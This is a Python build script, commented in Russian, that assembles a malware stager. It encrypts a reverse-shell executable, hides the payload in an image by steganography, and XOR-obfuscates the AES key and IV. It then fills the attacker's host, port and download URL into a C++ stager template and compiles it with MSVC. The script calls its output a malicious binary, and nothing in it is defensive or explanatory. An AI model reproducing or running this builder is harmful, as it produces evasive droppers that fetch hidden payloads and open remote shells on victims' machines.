import subprocess
import sys
import os
import tempfile
import shutil
from typing import Union
import re
from typing import Optional

DEFAULT_R_HOST = "127.0.0.1"
DEFAULT_R_PORT = 4444
DEFAULT_URL = "https://example.com/payload.png"

def _format_cpp_vector(name: str, values: list[int], per_line: int = 8, indent: str = '    ') -> str:
    parts = [f'0x{v:02x}' for v in values]
    if not parts:
        return f'const std::vector<BYTE> {name} = {{ }};'
    lines = []
    for i in range(0, len(parts), per_line):
        lines.append(indent + ', '.join(parts[i:i+per_line]))
    body = ',\n'.join(lines)
    return f'const std::vector<BYTE> {name} = {{\n{body}\n}};'

def read_and_obfuscate_hex(path: str, obfuscation_key: int,
                           name: Optional[str] = None,
                           per_line: int = 8) -> str:
    """
    Читает файл с HEX-данными (в любом формате: сплошной "aa11bb...", или
    с разделителями "aa 11 bb", "0xAA,0x11,0xBB", с переводами строк и т.д.),
    делает XOR-обфускацию по правилу
        out[i] = byte_i ^ ((obfuscation_key + i) & 0xFF)
    и возвращает строку:
      - если name is None: "0x12, 0xab, 0xff"
      - если name задан: полный C++-инициализатор
        "const std::vector<BYTE> <name> = { 0x12, ... };"
    :param path: путь к файлу с hex (ascii hex)
    :param obfuscation_key: целое, будет приведено к байту (0..255)
    :param name: если указано, вернуть полностью оформленный C++-initializer
    :param per_line: байт на строку при форматировании C++
    :return: строка с результатом
    """
    # прочитать файл
    with open(path, "r", encoding="utf-8") as f:
        raw = f.read()

    # удалить все не-hex символы (оставим только 0-9a-fA-F)
    cleaned = re.sub(r'[^0-9a-fA-F]', '', raw)
    if len(cleaned) == 0:
        raise ValueError(f"Файл {path} не содержит hex-данных.")

    if len(cleaned) % 2 != 0:
        raise ValueError(f"Файл {path} содержит нечетное количество hex-символов ({len(cleaned)}).")

    obf_key = int(obfuscation_key) & 0xFF

    values: list[int] = []
    for byte_index, i in enumerate(range(0, len(cleaned), 2)):
        hex_pair = cleaned[i:i+2]
        b = int(hex_pair, 16)
        obf_b = b ^ ((obf_key + byte_index) & 0xFF)
        values.append(obf_b)

    if name:
        return _format_cpp_vector(name, values, per_line=per_line)
    else:
        return ", ".join(f"0x{v:02x}" for v in values)


if len(sys.argv) < 2:
    print("Использование: python create_binary.py output.exe [r_host] [r_port] [url]")
    sys.exit(1)

output_exe = sys.argv[1]
r_host = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_R_HOST
r_port = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_R_PORT
url = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_URL

# Пути к файлам payload и ключам
payload_file = os.path.abspath(r"encrypted_payload/payload.txt")

exe_path = os.path.abspath(r"reverse_shell\reverse_shell_tls.exe")
out_path = payload_file

print(f"[+] Запуск create_encrypted_payload.exe с аргументами: -path {exe_path} -out {out_path}")

try:
    subprocess.run(
        ["create_encrypted_payload.exe", "-path", exe_path, "-out", out_path],
        check=True
    )
    print("[+] Файл успешно зашифрован")
except subprocess.CalledProcessError as e:
    print(f"[!] Ошибка при выполнении: {e}")
    sys.exit(1)

key_file = payload_file + ".key"
iv_file  = payload_file + ".iv"

if not os.path.exists(key_file) or not os.path.exists(iv_file):
    print(f"[!] Не найдены файлы ключей: {key_file}, {iv_file}")
    sys.exit(1)

steg_script = os.path.abspath("steg.py") 
images_dir = os.path.abspath("images_with_payload") 
print(f"[+] Запуск steg.py для внедрения {payload_file} в {images_dir}") 
try: # shell=True позволяет PowerShell запускать Python напрямую 
    subprocess.run(f'start /wait py "{steg_script}"', shell=True) 
    print("[+] steg.py успешно завершён") 
except subprocess.CalledProcessError as e: 
    print(f"[!] Ошибка при выполнении steg.py: {e}") 
    sys.exit(1) 
url = str(input('Введите url, где расположили вредоносную картинку: '))


# --- функция для чтения ключей ---
def read_hex_file(path: str) -> str:
    """Читает файл с HEX-строкой и возвращает C++-инициализацию std::vector<BYTE>."""
    with open(path, "r", encoding="utf-8") as f:
        hex_str = f.read().strip()

    if len(hex_str) % 2 != 0:
        raise ValueError(f"Файл {path} содержит нечетное количество символов!")

    # Формируем строку с байтами
    byte_list = [f"0x{hex_str[i:i+2]}" for i in range(0, len(hex_str), 2)]

    # Склеиваем в формат std::vector<BYTE>
    cpp_code = "const std::vector<BYTE> aesKey = { " + ", ".join(byte_list) + " };"
    return cpp_code


aes_key_list = read_and_obfuscate_hex(key_file, 0x7A)
aes_iv_list  = read_and_obfuscate_hex(iv_file, 0x7A)

print(f"[+] Компиляция с параметрами:")
print(f"    r_host   = {r_host}")
print(f"    r_port   = {r_port}")
print(f"    url      = {url}")
print(f"[+] Прочитанный AES Key: {aes_key_list}")
print(f"[+] Прочитанный AES IV : {aes_iv_list}")

# --- создаём временную папку ---
temp_dir = tempfile.mkdtemp()
print(f"[+] Создана временная папка: {temp_dir}")

# --- копируем исходники ---
shutil.copy("help/Stager.cpp", os.path.join(temp_dir, "Stager.cpp"))
stb_path = "help/stb_image.h"
if os.path.exists(stb_path):
    shutil.copy(stb_path, temp_dir)

cpp_path = os.path.join(temp_dir, "Stager.cpp")

# --- заменяем ключи, IV и URL ---
with open(cpp_path, "r", encoding="utf-8") as f:
    cpp_code = f.read()

cpp_code = cpp_code.replace("R_HOST_PLACEHOLDER", f'"{r_host}"')
cpp_code = cpp_code.replace("R_PORT_PLACEHOLDER", str(r_port))
cpp_code = cpp_code.replace('const std::wstring url_1 = L"..."',
                            f'const std::wstring url_1 = L"{url}"')
cpp_code = cpp_code.replace("const std::vector<BYTE> aesKey = { ... };",
                            f"const std::vector<BYTE> aesKey = {{ {aes_key_list} }};")
cpp_code = cpp_code.replace("const std::vector<BYTE> aesIV  = { ... };",
                            f"const std::vector<BYTE> aesIV = {{ {aes_iv_list} }};")

with open(cpp_path, "w", encoding="utf-8") as f:
    f.write(cpp_code)

# --- поиск Visual Studio ---
vswhere_path = os.path.join(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
                            "Microsoft Visual Studio", "Installer", "vswhere.exe")
if not os.path.exists(vswhere_path):
    print("[!] Не найден vswhere.exe")
    sys.exit(1)

vs_path = subprocess.check_output([
    vswhere_path,
    "-latest",
    "-products", "*",
    "-requires", "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
    "-property", "installationPath"
], encoding="utf-8").strip()

vcvarsall = os.path.join(vs_path, "VC", "Auxiliary", "Build", "vcvarsall.bat")
if not os.path.exists(vcvarsall):
    print("[!] Не найден vcvarsall.bat")
    sys.exit(1)

cl_cmd = f'"{vcvarsall}" x64 && cl.exe /EHsc /std:c++17 "{cpp_path}" /link winhttp.lib crypt32.lib advapi32.lib user32.lib /OUT:output_client/{output_exe}'
print(f"[+] Запуск компиляции: {cl_cmd}")

try:
    subprocess.run(cl_cmd, shell=True, check=True)
    print(f"[+] Компиляция завершена, файл: {output_exe}")
finally:
    #shutil.rmtree(temp_dir)
    print("Успешно создан бинарный вредоносный файл")
